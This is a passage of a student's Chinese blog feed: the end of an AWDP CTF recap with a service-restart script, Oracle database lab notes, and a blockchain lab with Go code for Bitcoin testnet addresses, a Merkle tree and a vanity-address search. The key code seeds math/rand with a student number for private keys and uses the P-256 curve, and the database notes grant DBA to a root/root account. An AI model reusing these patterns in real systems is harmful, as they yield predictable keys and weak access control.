<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">pkill -u user</span><br><span class="line">cat app.py &gt; /home/user/app.py</span><br><span class="line">nohup python3 /home/user/app.py &gt; res.file 2&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure>
<p>这个仅仅是python的，碰到那个java题更是难受，需要自己传jar包上去，虽然都代码怎么改是对的，但就是修不动。</p>
<p>总而言之第一次awdp因为不太懂Update.sh的问题错失了一道或者两道题的修补机会，少上了好多分，要是之前打过的话有经验的话就应该能进前四了。</p>
<p>另外awdp不让上网是真的难受，打web不上网，全靠一个脑子积累，碰到新的知识点只能干瞪眼。。。以后电脑里还是要多备这种类似rogue mysql server的神仙脚本吧。</p>
]]></content>
  </entry>
  <entry>
    <title>oracle数据库实验整理</title>
    <url>/2021/10/14/oracle%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%9E%E9%AA%8C%E6%95%B4%E7%90%86/</url>
    <content><![CDATA[<h1 id="oracle数据库实验整理"><a href="#oracle数据库实验整理" class="headerlink" title="oracle数据库实验整理"></a>oracle数据库实验整理</h1><ul>
<li>TNS数据库监听端口1521</li>
<li>MTS端口2258 ‘Oracle Services for Microsoft Transaction Server’ 的端口</li>
<li>HTTP监听端口9090</li>
</ul>
<p>千万别用8080！会和burp冲突，当时打比赛的时候直接一键删除了oracle，结果重装的时候差点被吓死。</p>
<p><a href="https://blog.csdn.net/weixin_43620238/article/details/84497520">https://blog.csdn.net/weixin_43620238/article/details/84497520</a></p>
<p>用管理员身份在cmd里删除注册表后才叫彻底删除。</p>
<p>重装后参考了这篇博客<a href="https://blog.csdn.net/qq_40391559/article/details/88854961，把http端口改成了9090。">https://blog.csdn.net/qq_40391559/article/details/88854961，把http端口改成了9090。</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sc delete OracleServiceXE</span><br></pre></td></tr></table></figure>
<h3 id="创建用户"><a href="#创建用户" class="headerlink" title="创建用户"></a>创建用户</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create user root identified by root;</span><br><span class="line">设置权限</span><br><span class="line">grant dba to root;</span><br></pre></td></tr></table></figure>
<h3 id="无用户名登录"><a href="#无用户名登录" class="headerlink" title="无用户名登录"></a>无用户名登录</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqlplus / as sysdba;</span><br><span class="line">sqlplus sys/nolog as sysdba;</span><br></pre></td></tr></table></figure>
<h3 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlplus username/pwd@ip:port/orcl as sysdba</span><br><span class="line">as sysdba是以系统管理员的身份来登录</span><br><span class="line">普通用户：</span><br><span class="line">sqlplus username/pwd</span><br></pre></td></tr></table></figure>
<p>dba：Database Administrator数据库管理员</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select name,dbid from v$database;查看数据库名</span><br></pre></td></tr></table></figure>
<h3 id="developer图形化界面连接数据库："><a href="#developer图形化界面连接数据库：" class="headerlink" title="developer图形化界面连接数据库："></a>developer图形化界面连接数据库：</h3><p>将主机名修改为localhost即可。</p>
<p><img src="/2021/10/14/oracle%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%9E%E9%AA%8C%E6%95%B4%E7%90%86/assets/image-20211014152202324.png" alt="image-20211014152202324"></p>
<p>oracle不会像mysql一样每一条都执行，需要在最后手动执行<code>commit;</code>指令进行提交。（叫提交修改）</p>
<h3 id="oracle表空间"><a href="#oracle表空间" class="headerlink" title="oracle表空间"></a>oracle表空间</h3><p>ORACLE数据库被划分成称作为表空间的逻辑区域——形成ORACLE数据库的<a href="https://baike.baidu.com/item/逻辑结构">逻辑结构</a>。一个ORACLE数据库能够有一个或多个表空间,而一个表空间则对应着一个或多个物理的<a href="https://baike.baidu.com/item/数据库文件">数据库文件</a>。表空间是ORACLE<a href="https://baike.baidu.com/item/数据库恢复">数据库恢复</a>的最小单位,容纳着许多数据库实体,如表、视图、索引、聚簇、回退段和临时段等。</p>
<h4 id="查看表空间："><a href="#查看表空间：" class="headerlink" title="查看表空间："></a>查看表空间：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from v$tablespace;</span><br></pre></td></tr></table></figure>
<p><img src="/2021/10/14/oracle%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%9E%E9%AA%8C%E6%95%B4%E7%90%86/assets/image-20211027160409438.png" alt="image-20211027160409438"></p>
<p><img src="/2021/10/14/oracle%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%9E%E9%AA%8C%E6%95%B4%E7%90%86/assets/image-20211027160353930.png" alt="image-20211027160353930"></p>
<p>可以发现是能对应上的。</p>
<h4 id="查看每个表空间有哪些数据文件："><a href="#查看每个表空间有哪些数据文件：" class="headerlink" title="查看每个表空间有哪些数据文件："></a>查看每个表空间有哪些数据文件：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">desc dba_data_files;</span><br></pre></td></tr></table></figure>
<h4 id="查看详细数据文件："><a href="#查看详细数据文件：" class="headerlink" title="查看详细数据文件："></a>查看详细数据文件：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select file_name,tablespace_name from dba_data_files;</span><br></pre></td></tr></table></figure>
<h4 id="新建表空间"><a href="#新建表空间" class="headerlink" title="新建表空间"></a>新建表空间</h4><p><a href="https://blog.csdn.net/starnight_cbj/article/details/6792364">https://blog.csdn.net/starnight_cbj/article/details/6792364</a></p>
<h3 id="修改字符集"><a href="#修改字符集" class="headerlink" title="修改字符集"></a>修改字符集</h3><h4 id="查看当前字符集"><a href="#查看当前字符集" class="headerlink" title="查看当前字符集"></a>查看当前字符集</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select userenv(&#x27;language&#x27;) from dual;</span><br></pre></td></tr></table></figure>
<p>实验要求要修改为ZHS16GBK，不知道为啥要往小了变。</p>
<h3 id="create表"><a href="#create表" class="headerlink" title="create表"></a>create表</h3><p>创建一个外键约束</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE TABLE child_table (</span><br><span class="line">    ...</span><br><span class="line">    CONSTRAINT fk_name</span><br><span class="line">    FOREIGN KEY(col1, col2,...) REFERENCES parent_table(col1,col2) </span><br><span class="line">    ON DELETE [ CASCADE | SET NULL ]</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<p>ON DELETE CASCADE:如果父表中的一行被删除，那么子表中引用被删除行的所有行都将被删除。</p>
<p>ON DELETE SET NULL:如果父表中的一行被删除，那么对于外键列，子表中引用被删除行的所有行将被设置为NULL。</p>
<p>一个表可以有多个外键约束</p>
<h3 id="drop表"><a href="#drop表" class="headerlink" title="drop表"></a>drop表</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">drop table countries;</span><br></pre></td></tr></table></figure>
<h3 id="删表所有内容"><a href="#删表所有内容" class="headerlink" title="删表所有内容"></a>删表所有内容</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">delete from abc;</span><br></pre></td></tr></table></figure>
<p>insert的时候前后加上</p>
<ol>
<li><p>REM INSERTING into database1.”Users”</p>
</li>
<li><p>SET DEFINE OFF;</p>
<p>的原因：默认情况下，<a href="https://www.jb51.cc/tag/sql/">sql</a> Plus处理’&amp;’作为开始替换字符串的特殊字符。这可能会导致运行脚本的问题，而这些脚本恰好包含’&amp;’由于其他原因：</p>
<p>如果您知道您的脚本包含(或可能包含)包含“&amp;”的数据字符，并且您不想像上述那样执行替换行为，然后在运行脚本时使用set define off<a href="https://www.jb51.cc/tag/guanbi/">关闭</a>该行为：</p>
</li>
</ol>
]]></content>
  </entry>
  <entry>
    <title>区块链实验</title>
    <url>/2021/10/19/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%9E%E9%AA%8C/</url>
    <content><![CDATA[<p>本学期相对比较比较比较有意思的一门课，要把学习的过程记录下来。</p>
<span id="more"></span>
<h1 id="Week1"><a href="#Week1" class="headerlink" title="Week1"></a>Week1</h1><h2 id="环境安装"><a href="#环境安装" class="headerlink" title="环境安装"></a>环境安装</h2><p>安装go环境，下载jb公司的Goland（半年前下载的），自带了一个<code>go 16.8 windows/amd64</code>版本，在linux下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install golang-go</span><br></pre></td></tr></table></figure>
<p>一键就能装好新版本，是<code>go version go1.13.8 linux/amd64</code>。</p>
<p>然后配置gopath,gopath的作用是存放sdk以外的第三方类库和自己复用的代码，一般GOPATH分为Global GOPATH和Project GOPATH，而gopath里包含三个文件：src(源代码),pkg(中间文件),bin(可执行文件)，具体的我还没搞明白，反正目前长这样：</p>
<p><img src="/2021/10/19/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%9E%E9%AA%8C/assets/image-20211019134251450.png" alt="image-20211019134251450"></p>
<p>然后在<code>Run/Debug Configurations</code>里选用<code>go build</code>就能编译代码了。</p>
<p>我的helloworld：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	fmt.Printf(<span class="string">&quot;hello world\n&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="GO初学踩坑"><a href="#GO初学踩坑" class="headerlink" title="GO初学踩坑"></a>GO初学踩坑</h2><h3 id="bx"><a href="#bx" class="headerlink" title="bx"></a>bx</h3><p>发现了一个好东西，叫做bitcoin-explorer，中文名是区块链-比特币浏览器，它是一个独立的、跨平台的比特币命令行工具，方便我debug用的，但是我在linux上没下到。</p>
<p>网址是<a href="https://blockexplorer.com/">https://blockexplorer.com/</a></p>
<p>Bitcoin Command Line Tool：命令行下载网址：<a href="https://github.com/libbitcoin/libbitcoin-explorer">https://github.com/libbitcoin/libbitcoin-explorer</a></p>
<p>防止翻车我去下到我的虚拟机里了，需要进行一波巨长的<code>install.sh</code>，最后一波有连续六个git clone，能不能克隆下来完全靠脸，我最高记录是到第五轮寄了，要改的话得去改800多行的.sh文件，但我懒得改了，就这样吧。</p>
<h3 id="文件位置"><a href="#文件位置" class="headerlink" title="文件位置"></a>文件位置</h3><p>设置好gopath后，为了调用<code>golang.org/x/crypto/ripemd160</code>这个函数，我把<code>golang.org</code>这个文件夹放在了<code>$GOPATH/src</code>下，但是仍然无法在我的项目下build，一直显示这个错误：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">no required module provides package golang.org/x/crypto/ripemd160; to add it</span><br><span class="line">    go get golang.org/x/crypto/ripemd160 </span><br></pre></td></tr></table></figure>
<p>当时就一脸懵逼，我不是库都装好了吗，为啥他找不到，最后的解决是我把项目文件放到<code>$GOPATH/src</code>下的同目录下了，终于能进行正常的import了。</p>
<h3 id="package问题"><a href="#package问题" class="headerlink" title="package问题"></a>package问题</h3><p>当你做这个实验，你要整个项目都以package形式build的话，你要修改你的package main，表示这是一个入口文件，然后才能go build.</p>
<p>等你实验做完了，要把当成一个package了，以后想用这个函数，再把package name改成原来那个就行。</p>
<h2 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h2><h3 id="三个数lcm"><a href="#三个数lcm" class="headerlink" title="三个数lcm"></a>三个数lcm</h3><p>秒了</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">gcd</span><span class="params">(a, b <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">	<span class="keyword">if</span> b == <span class="number">0</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> a</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> gcd(b, a%b)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">lcm</span><span class="params">(a, b <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">	<span class="keyword">return</span> a * b / gcd(a, b)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">three_lcm_test</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> a, b, c <span class="keyword">int</span></span><br><span class="line">	fmt.Scan(&amp;a, &amp;b, &amp;c)</span><br><span class="line">	fmt.Printf(<span class="string">&quot;%d&quot;</span>, lcm(lcm(a, b), c))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="生成比特币交易地址"><a href="#生成比特币交易地址" class="headerlink" title="生成比特币交易地址"></a>生成比特币交易地址</h3><p><img src="/2021/10/19/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%9E%E9%AA%8C/assets/image-20211022133136523.png" alt="image-20211022133136523"></p>
<p>收集到的比特币公私钥和地址各种格式前缀</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>种类</th>
<th>版本前缀 (hex)</th>
</tr>
</thead>
<tbody>
<tr>
<td>Bitcoin Address</td>
<td>0x00</td>
</tr>
<tr>
<td>Pay-to-Script-Hash Address</td>
<td>0x05</td>
</tr>
<tr>
<td>Bitcoin Testnet Address</td>
<td>0x6F</td>
</tr>
<tr>
<td>Private Key WIF</td>
<td>0x80</td>
</tr>
<tr>
<td>BIP38 Encrypted Private Key</td>
<td>0x0142</td>
</tr>
<tr>
<td>BIP32 Extended Public Key</td>
<td>0x0488B21E</td>
</tr>
</tbody>
</table>
</div>
<p>在本次实验中我们选用的Bitcoin Testnet Address，故版本前缀为<code>0x6F</code></p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;base58&quot;</span></span><br><span class="line">	<span class="string">&quot;crypto/sha256&quot;</span></span><br><span class="line">	<span class="string">&quot;encoding/hex&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;golang.org/x/crypto/ripemd160&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> VersionByte = []<span class="keyword">byte</span>(<span class="string">&quot;\x6f&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Sha256</span><span class="params">(src []<span class="keyword">byte</span>)</span> []<span class="title">byte</span></span> &#123;</span><br><span class="line">	m := sha256.New()</span><br><span class="line">	m.Write(src)</span><br><span class="line">	<span class="keyword">return</span> m.Sum(<span class="literal">nil</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Ripemd160</span><span class="params">(src []<span class="keyword">byte</span>)</span> []<span class="title">byte</span></span> &#123;</span><br><span class="line">	m := ripemd160.New()</span><br><span class="line">	m.Write(src)</span><br><span class="line">	<span class="keyword">return</span> m.Sum(<span class="literal">nil</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Hash160</span><span class="params">(src []<span class="keyword">byte</span>)</span> []<span class="title">byte</span></span> &#123;</span><br><span class="line">	<span class="keyword">return</span> Ripemd160(Sha256(src))</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Hash256</span><span class="params">(src []<span class="keyword">byte</span>)</span> []<span class="title">byte</span></span> &#123;</span><br><span class="line">	<span class="keyword">return</span> Sha256(Sha256(src))</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Base58</span><span class="params">(src []<span class="keyword">byte</span>)</span> <span class="title">string</span></span> &#123;</span><br><span class="line">	myAlphabet := base58.BitcoinAlphabet</span><br><span class="line">	encodedString := base58.Encode(src, myAlphabet)</span><br><span class="line">	<span class="keyword">return</span> encodedString</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getAddress</span><span class="params">(src []<span class="keyword">byte</span>)</span> <span class="title">string</span></span>&#123;</span><br><span class="line">	fingerprint := Hash160(src)</span><br><span class="line">	Checksum := Hash256((<span class="built_in">append</span>(VersionByte, fingerprint...)))[:<span class="number">4</span>]</span><br><span class="line">	<span class="keyword">var</span> base = <span class="built_in">append</span>(<span class="built_in">append</span>(VersionByte, fingerprint...), Checksum...)</span><br><span class="line">	<span class="keyword">return</span> Base58(base)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">TestURL</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> data <span class="keyword">string</span></span><br><span class="line">	fmt.Scanf(<span class="string">&quot;%s&quot;</span>, &amp;data)</span><br><span class="line">	pubkey, _ := hex.DecodeString(data)</span><br><span class="line">	fmt.Printf(<span class="string">&quot;%s\n&quot;</span>, getAddress(pubkey))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在代码实现的时候纠结了一会[]byte和string的事情，还有上来不知道hex.DecodeString，还自己手动对读进来的字符串进行两两分组然后sscanf..</p>
<h3 id="Merkle-Tree"><a href="#Merkle-Tree" class="headerlink" title="Merkle Tree"></a>Merkle Tree</h3><p>可以简单理解为一棵二叉树的哈希，只有叶节点存交易数据块，如果订单发生改变，那么这条链的哈希值都会发生改变，所以在分析哪里发生交易了，就可以从根节点往下dfs，一直往哈希值改变的儿子走，走$log$次就能走到发生改变的节点。</p>
<p>于是实现的时候采用了动态开节点，为了方便定位叶子节点的位置，所以在传参的时候传了个当前编号，编号规则类似与线段树，在比较两棵树的时候就往下递归查询即可,compareMerkleTree函数会返回发生数据变化的节点块。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;encoding/hex&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> MerkleNode <span class="keyword">struct</span> &#123;</span><br><span class="line">	lson *MerkleNode</span><br><span class="line">	rson *MerkleNode</span><br><span class="line">	Data []<span class="keyword">byte</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">createNode</span><span class="params">(left, right *MerkleNode, data []<span class="keyword">byte</span>)</span> *<span class="title">MerkleNode</span></span> &#123;</span><br><span class="line">	now := MerkleNode&#123;&#125;</span><br><span class="line">	<span class="keyword">if</span> left == <span class="literal">nil</span> &amp;&amp; right == <span class="literal">nil</span> &#123;</span><br><span class="line">		now.Data = Sha256(data)</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		mix := <span class="built_in">append</span>(left.Data, right.Data...)</span><br><span class="line">		now.Data = Sha256(mix)</span><br><span class="line">	&#125;</span><br><span class="line">	now.lson = left</span><br><span class="line">	now.rson = right</span><br><span class="line">	<span class="keyword">return</span> &amp;now</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">build</span><span class="params">(depth, id, total <span class="keyword">int</span>, params [][]<span class="keyword">byte</span>)</span> *<span class="title">MerkleNode</span></span> &#123;</span><br><span class="line">	<span class="keyword">if</span> depth == total &#123;</span><br><span class="line">		here := createNode(<span class="literal">nil</span>, <span class="literal">nil</span>, params[id-(<span class="number">1</span>&lt;&lt;depth)])</span><br><span class="line">		<span class="keyword">return</span> here</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		lson := build(depth+<span class="number">1</span>, id&lt;&lt;<span class="number">1</span>, total, params)</span><br><span class="line">		rson := build(depth+<span class="number">1</span>, id&lt;&lt;<span class="number">1</span>|<span class="number">1</span>, total, params)</span><br><span class="line">		here := createNode(lson, rson, <span class="literal">nil</span>)</span><br><span class="line">		<span class="keyword">return</span> here</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">compareMerkleTree</span><span class="params">(tree1, tree2 *MerkleNode, depth, id, total <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">	<span class="keyword">if</span> depth == total &#123;</span><br><span class="line">		<span class="keyword">if</span> hex.EncodeToString(tree1.Data) != hex.EncodeToString(tree2.Data) &#123;</span><br><span class="line">			<span class="keyword">return</span> id - (<span class="number">1</span> &lt;&lt; depth)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> tree1.lson != <span class="literal">nil</span> &amp;&amp; tree2.lson != <span class="literal">nil</span> &#123;</span><br><span class="line">		res := compareMerkleTree(tree1.lson, tree2.lson, depth+<span class="number">1</span>, id&lt;&lt;<span class="number">1</span>, total)</span><br><span class="line">		<span class="keyword">if</span> res != <span class="number">-1</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> res</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> tree1.rson != <span class="literal">nil</span> &amp;&amp; tree2.rson != <span class="literal">nil</span> &#123;</span><br><span class="line">		res := compareMerkleTree(tree1.rson, tree2.rson, depth+<span class="number">1</span>, id&lt;&lt;<span class="number">1</span>|<span class="number">1</span>, total)</span><br><span class="line">		<span class="keyword">if</span> res != <span class="number">-1</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> res</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> weight_A = [][]<span class="keyword">byte</span>&#123;[]<span class="keyword">byte</span>(<span class="string">&quot;\x00&quot;</span>), []<span class="keyword">byte</span>(<span class="string">&quot;\x01&quot;</span>), []<span class="keyword">byte</span>(<span class="string">&quot;\x02&quot;</span>), []<span class="keyword">byte</span>(<span class="string">&quot;\x03&quot;</span>), []<span class="keyword">byte</span>(<span class="string">&quot;\x04&quot;</span>), []<span class="keyword">byte</span>(<span class="string">&quot;\x05&quot;</span>), []<span class="keyword">byte</span>(<span class="string">&quot;\x06&quot;</span>), []<span class="keyword">byte</span>(<span class="string">&quot;\x07&quot;</span>), []<span class="keyword">byte</span>(<span class="string">&quot;\x08&quot;</span>), []<span class="keyword">byte</span>(<span class="string">&quot;\x09&quot;</span>), []<span class="keyword">byte</span>(<span class="string">&quot;\x0a&quot;</span>), []<span class="keyword">byte</span>(<span class="string">&quot;\x0b&quot;</span>), []<span class="keyword">byte</span>(<span class="string">&quot;\x0c&quot;</span>), []<span class="keyword">byte</span>(<span class="string">&quot;\x0d&quot;</span>), []<span class="keyword">byte</span>(<span class="string">&quot;\x0e&quot;</span>), []<span class="keyword">byte</span>(<span class="string">&quot;\x0f&quot;</span>)&#125;</span><br><span class="line"><span class="keyword">var</span> weight_B = [][]<span class="keyword">byte</span>&#123;[]<span class="keyword">byte</span>(<span class="string">&quot;\x00&quot;</span>), []<span class="keyword">byte</span>(<span class="string">&quot;\x01&quot;</span>), []<span class="keyword">byte</span>(<span class="string">&quot;\x03&quot;</span>), []<span class="keyword">byte</span>(<span class="string">&quot;\x03&quot;</span>), []<span class="keyword">byte</span>(<span class="string">&quot;\x04&quot;</span>), []<span class="keyword">byte</span>(<span class="string">&quot;\x05&quot;</span>), []<span class="keyword">byte</span>(<span class="string">&quot;\x06&quot;</span>), []<span class="keyword">byte</span>(<span class="string">&quot;\x07&quot;</span>), []<span class="keyword">byte</span>(<span class="string">&quot;\x08&quot;</span>), []<span class="keyword">byte</span>(<span class="string">&quot;\x09&quot;</span>), []<span class="keyword">byte</span>(<span class="string">&quot;\x0a&quot;</span>), []<span class="keyword">byte</span>(<span class="string">&quot;\x0b&quot;</span>), []<span class="keyword">byte</span>(<span class="string">&quot;\x0c&quot;</span>), []<span class="keyword">byte</span>(<span class="string">&quot;\x0d&quot;</span>), []<span class="keyword">byte</span>(<span class="string">&quot;\x0e&quot;</span>), []<span class="keyword">byte</span>(<span class="string">&quot;\x0f&quot;</span>)&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">MerkleTree_test</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> Aroot = build(<span class="number">0</span>, <span class="number">1</span>, <span class="number">4</span>, weight_A)</span><br><span class="line">	<span class="keyword">var</span> Broot = build(<span class="number">0</span>, <span class="number">1</span>, <span class="number">4</span>, weight_B)</span><br><span class="line">	fmt.Printf(<span class="string">&quot;%s\n&quot;</span>, hex.EncodeToString(Aroot.Data))</span><br><span class="line">	fmt.Printf(<span class="string">&quot;%s\n&quot;</span>, hex.EncodeToString(Broot.Data))</span><br><span class="line">	fmt.Printf(<span class="string">&quot;%d\n&quot;</span>, compareMerkleTree(Aroot, Broot, <span class="number">0</span>, <span class="number">1</span>, <span class="number">4</span>))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="拓展实验"><a href="#拓展实验" class="headerlink" title="拓展实验"></a>拓展实验</h3><p>挖矿，用自己的学号当种子算私钥，然后再算公钥，再用第二份算地址的代码算base58，如果里面包含ccc的子串，那就提交到网址，获取小额测试用比特币。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;crypto/ecdsa&quot;</span></span><br><span class="line">	<span class="string">&quot;crypto/elliptic&quot;</span></span><br><span class="line">	<span class="string">&quot;encoding/hex&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;math/rand&quot;</span></span><br><span class="line">	<span class="string">&quot;strings&quot;</span></span><br><span class="line">)</span><br><span class="line"><span class="keyword">var</span> src = rand.New(rand.NewSource(xxxx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">RandStringBytesMaskImprSrc</span><span class="params">(n <span class="keyword">int</span>)</span> <span class="title">string</span></span> &#123;</span><br><span class="line">	b := <span class="built_in">make</span>([]<span class="keyword">byte</span>, (n+<span class="number">1</span>)/<span class="number">2</span>)</span><br><span class="line">	<span class="keyword">if</span> _, err := src.Read(b); err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(err)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> hex.EncodeToString(b)[:n]</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">newKeyPair</span><span class="params">()</span> <span class="params">(ecdsa.PrivateKey,[]<span class="keyword">byte</span>)</span></span>&#123;</span><br><span class="line">	curve :=elliptic.P256()</span><br><span class="line">	private,err :=ecdsa.GenerateKey(curve,strings.NewReader(RandStringBytesMaskImprSrc(<span class="number">50</span>)))</span><br><span class="line">	<span class="keyword">if</span> err !=<span class="literal">nil</span>&#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;error&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	pubkey :=<span class="built_in">append</span>(private.PublicKey.X.Bytes(),private.PublicKey.Y.Bytes()...)</span><br><span class="line">	<span class="keyword">return</span> *private,pubkey</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Checkccc</span><span class="params">(src <span class="keyword">string</span>)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">	length := <span class="built_in">len</span>(src)</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; length - <span class="number">2</span>; i++ &#123;</span><br><span class="line">		<span class="keyword">if</span> src[i] == <span class="string">&#x27;c&#x27;</span> &amp;&amp; src[i + <span class="number">1</span>] ==<span class="string">&#x27;c&#x27;</span> &amp;&amp; src[i + <span class="number">2</span>] ==<span class="string">&#x27;c&#x27;</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">MineCracker_test</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">for</span> &#123;</span><br><span class="line">		privatekey,public :=newKeyPair()</span><br><span class="line">		address := getAddress(public)</span><br><span class="line">		<span class="keyword">if</span> Checkccc(address) == <span class="literal">true</span> &#123;</span><br><span class="line">			fmt.Printf(<span class="string">&quot;%x\n&quot;</span>,privatekey.D.Bytes())</span><br><span class="line">			fmt.Printf(<span class="string">&quot;%s\n&quot;</span>,hex.EncodeToString(public))</span><br><span class="line">			fmt.Printf(<span class="string">&quot;%s\n&quot;</span>, address)</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
